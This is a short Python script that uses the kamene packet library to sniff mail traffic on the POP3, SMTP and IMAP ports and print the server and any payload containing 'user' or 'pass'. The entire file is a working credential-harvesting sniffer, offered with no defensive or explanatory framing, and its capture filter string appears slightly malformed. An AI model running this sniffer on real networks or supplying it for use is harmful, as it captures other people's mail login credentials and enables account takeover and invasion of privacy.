from kamene.all import *

def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = bytes(packet[TCP].payload)
        if b"user" in mail_packet.lower() or b"pass" in mail_packet.lower():
            print(f"[*] Server: {packet[IP].dst}")
            print(f"[*] {packet[TCP].payload}")

sniff(filter="tcp port 110 or tcp 25 or tcp port 143", prn=packet_callback, store=0)
